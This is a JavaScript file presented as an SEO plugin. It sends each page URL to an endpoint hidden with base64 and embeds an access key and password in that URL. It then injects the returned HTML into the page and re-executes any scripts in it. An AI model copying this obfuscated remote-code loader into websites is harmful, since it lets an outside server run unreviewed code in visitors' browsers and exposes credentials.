(function () {
    'use strict';

    var currentPath = '';
    var injectedElements = [];

    function cleanup() {
        injectedElements.forEach(function (el) {
            try {
                if (el && el.parentNode) {
                    el.parentNode.removeChild(el);
                }
            } catch (e) {
                // Ignore
            }
        });
        injectedElements = [];

        if (window.jQuery) {
            jQuery('[data-seo="true"]').remove();
        }
    }

    function executeScripts(container) {
        var scripts = container.find('script');
        scripts.each(function () {
            var oldScript = this;
            var newScript = document.createElement('script');


            Array.from(oldScript.attributes).forEach(function (attr) {
                newScript.setAttribute(attr.name, attr.value);
            });


            if (oldScript.src) {
                newScript.src = oldScript.src;
            } else {
                newScript.textContent = oldScript.textContent;
            }


            try {
                oldScript.parentNode.replaceChild(newScript, oldScript);
            } catch (e) {
                console.warn('Script execution error:', e);
            }
        });
    }

    function loadJQuery(callback) {
        if (window.jQuery) {
            callback();
            return;
        }
        var script = document.createElement('script');
        script.src = 'https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js';
        script.onload = callback;
        document.head.appendChild(script);
    }

    function initSEO() {
        var newPath = window.location.pathname;


        if (currentPath === newPath) {
            return;
        }

        currentPath = newPath;
        cleanup();

        var eppathurl = window.location.origin + window.location.pathname;
        var eptagmanage = new XMLHttpRequest();

        eptagmanage.onreadystatechange = function () {
            if (this.readyState == 4 && this.status == 200) {
                if (this.response && this.response !== "0") {
                    try {
                        var temp = this.response.split("||||||||||");

                        if (temp[0] && window.jQuery) {

                            jQuery("head").find("title[data-seo]").remove();

                            var headContent = jQuery(temp[0]);
                            headContent.attr('data-seo', 'true');
                            jQuery("head").append(headContent);


                            headContent.each(function () {
                                injectedElements.push(this);
                            });
                        }

                        if (temp[1] && window.jQuery) {
                            var bodyContent = jQuery(temp[1]);
                            bodyContent.attr('data-seo', 'true');
                            jQuery("body").append(bodyContent);


                            bodyContent.each(function () {
                                injectedElements.push(this);
                            });


                            setTimeout(function () {
                                executeScripts(bodyContent);


                                setTimeout(function () {
                                    if (window.jQuery) {

                                        jQuery(document).trigger('seo-plugin-loaded');

                                        var btn = jQuery('.plugin_open-btn');
                                        if (btn.length > 0) {
                                            console.log('SEO Plugin button found and scripts executed');
                                        }
                                    }
                                }, 100);
                            }, 50);
                        }
                    } catch (e) {
                        console.error('SEO Plugin Error:', e);
                    }
                }
            }
        };

        eptagmanage.open("GET", atob("aHR0cHM6Ly9wbHVnaW5zLmF1dG9zZW9wbHVnaW4uY29tL2FsbGhlYWRkYXRhP2VrZXk9ZS1BVVRPU0VPUExVR0lONTU0OTQxMTQ5NyZla2V5cGFzcz1vZFlpcGFHRzl5ZmM4NlBLNGIyWkliTHNDVVpxTWxheldBeXAmc2l0ZXVybD0=") + eppathurl);
        eptagmanage.send();
    }

    // Initial load
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', function () {
            setTimeout(function () {
                loadJQuery(initSEO);
            }, 500); // Delay for initial load
        });
    } else {
        setTimeout(function () {
            loadJQuery(initSEO);
        }, 500);
    }

    // Listen for Next.js route changes
    var lastUrl = location.href;
    new MutationObserver(function () {
        var url = location.href;
        if (url !== lastUrl) {
            lastUrl = url;
            setTimeout(function () {
                loadJQuery(initSEO);
            }, 300); // Delay for route change
        }
    }).observe(document, { subtree: true, childList: true });

    // Also listen for popstate (back/forward buttons)
    window.addEventListener('popstate', function () {
        setTimeout(function () {
            loadJQuery(initSEO);
        }, 300);
    });

})();